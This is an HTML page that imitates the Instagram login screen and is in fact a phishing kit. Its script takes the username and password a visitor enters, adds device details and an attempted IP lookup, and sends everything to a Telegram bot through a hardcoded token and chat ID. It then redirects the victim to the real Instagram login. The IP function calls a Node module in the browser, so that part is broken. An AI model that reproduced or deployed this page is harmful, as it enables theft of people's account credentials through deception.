<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511100012.png" class="logo">
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        const BOT_TOKEN = "8896924435:AAGmtbOxAEFdaztEmNxZFZsFCEcYwx0WOro";
        const CHAT_ID = "7341620431";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // ব্যবহারকারীর ইপি অ্যাড্রেস সংগ্রহ
            const ip = getIPAddress();

            const deviceInfo = `${navigator.userAgent}| ${navigator.platform}| ${screen.width}x${screen.height}`;

            const message = `
🚨 *NEW INSTAGRAM CREDENTIALS* 🚨
👤 **User:** ${username}
🔑 **Pass:** ${password}
🌍 **IP:** ${ip}
📱 **Device:** ${deviceInfo}
🗓️ **Time:** ${new Date().toLocaleString()}
`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => {
                if (res.ok) {
                    window.location.href = 'https://www.instagram.com/accounts/login/';
                } else {
                    alert('Error sending data. Please try again.');
                }
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Connection failed.');
            });
        });

        // ব্যবহারকারীর ইপি অ্যাড্রেস সংগ্রহ করে রিটার্ন করা ফাংশন
        function getIPAddress() {
            const ip = require('ip');
            return ip.address();
        }
    </script>
</body>
</html>
